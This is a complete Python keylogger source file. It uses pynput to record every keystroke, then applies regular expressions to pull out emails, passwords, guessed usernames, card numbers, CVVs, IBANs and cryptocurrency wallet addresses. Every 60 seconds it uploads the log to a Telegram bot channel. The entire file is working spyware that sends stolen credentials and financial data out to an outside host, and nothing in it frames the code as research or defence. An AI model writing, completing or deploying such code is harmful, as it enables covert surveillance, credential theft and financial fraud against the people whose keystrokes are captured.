import pynput.keyboard as keyboard  # type: ignore
import threading
import requests  # type: ignore
from datetime import datetime
import os
import re

# Telegram Configuration
TELEGRAM_API_TOKEN = "YOUR_TOKEN"
TELEGRAM_CHANNEL_ID = "YOUR_CHANNEL_ID"

# Function to generate the log file name
def generate_log_filename():
    now = datetime.now()
    filename = f"info_{now.strftime('%Y-%m-%d_%H-%M')}.txt"
    # Create the file if it doesn't exist
    if not os.path.exists(filename):
        open(filename, "w").close()
    return filename

# Function to log the pressed keys
def log_key(key):
    global LOG_FILE
    try:
        with open(LOG_FILE, "a") as log:
            # Handle special keys
            if key == keyboard.Key.enter:
                log.write("\n")  # Newline for [Enter]
            elif key == keyboard.Key.space:
                log.write(" ")  # Space for [Spacebar]
            # Handle normal characters
            elif hasattr(key, 'char') and key.char is not None:
                log.write(key.char)
    except Exception as e:
        with open(LOG_FILE, "a") as log:
            log.write(f"[Error: {e}]\n")

# Listener to intercept the keys
listener = keyboard.Listener(on_press=log_key)

# Function to analyze patterns word by word
def analyze_patterns(log_file):
    patterns = {
        "Email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "Password": r"(?=.*[a-zA-Z])(?=.*\d)(?=.*[!@#$%^&*()_+=\-{}\[\]:;'\"<>,.?/\\|]).{8,}",
        "Credit Card": r"\b\d{12,19}\b",
        "Date": r"\b\d{1,2}[/-]\d{1,2}[/-]\d{2,4}\b|\b\d{4}-\d{2}-\d{2}\b",
        "CVV": r"\b\d{3,4}\b",
        "IBAN": r"\b[A-Z]{2}\d{2}[A-Z0-9]{10,32}\b",
        "Phone Number": r"\+?\b\d{9,15}\b",
        "Bitcoin Wallet": r"\b(1|3|bc1)[a-zA-Z0-9]{25,39}\b",
        "Ethereum Wallet": r"\b0x[a-fA-F0-9]{40}\b",
    }

    results = {key: [] for key in patterns.keys()}
    results["Username"] = []  # Specific field for the 3 words preceding a password

    try:
        with open(log_file, "r") as log:
            lines = log.readlines()

        # Word-by-word analysis
        for line in lines:
            words = re.split(r'\s+', line.strip())
            for j, word in enumerate(words):
                for key, pattern in patterns.items():
                    if re.fullmatch(pattern, word):  # Check the entire word
                        results[key].append(word)

                        # Associate the last 3 preceding words as Username if it's a Password
                        if key == "Password" and j >= 3:
                            previous_words = words[j - 3:j]
                            results["Username"].append(" ".join(previous_words))

        # Remove duplicates
        for key in results:
            results[key] = list(set(results[key]))

        return results
    except Exception as e:
        print(f"Error in pattern analysis: {e}")
        return None


# Function to append the possible patterns to the sent file
def append_analysis_to_log(log_file, analysis_results):
    try:
        with open(log_file, "a") as log:
            log.write("\n--- PATTERN ANALYSIS ---\n")
            for key, matches in analysis_results.items():
                log.write(f"{key} found: {', '.join(matches) if matches else 'None'}\n")
    except Exception as e:
        print(f"Error in appending analysis to log: {e}")

# Function to send the log to the Telegram channel
def send_log_to_channel():
    global LOG_FILE
    try:
        # Check if the file exists
        if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
            print(f"File {LOG_FILE} not found or empty, skipping send.")
            return

        # Analyze the patterns
        analysis_results = analyze_patterns(LOG_FILE)
        if analysis_results:
            append_analysis_to_log(LOG_FILE, analysis_results)

        # Send the analyzed log to the Telegram channel
        with open(LOG_FILE, "rb") as file:
            response = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_API_TOKEN}/sendDocument",
                data={"chat_id": TELEGRAM_CHANNEL_ID},
                files={"document": file}
            )
            if response.status_code == 200:
                print("Log sent to Telegram channel!")
            else:
                print(f"Error in sending: {response.status_code}, {response.text}")

        # Generate a new file
        LOG_FILE = generate_log_filename()
    except Exception as e:
        print(f"Error in sending log to Telegram channel: {e}")

# Function to send the log periodically
def periodic_telegram():
    send_log_to_channel()
    threading.Timer(60, periodic_telegram).start()  # Runs every 60 seconds

# Global variable for the current log file
LOG_FILE = generate_log_filename()

# Start the listener
listener.start()

# Send the log periodically
periodic_telegram()

# Keep the program running
listener.join()
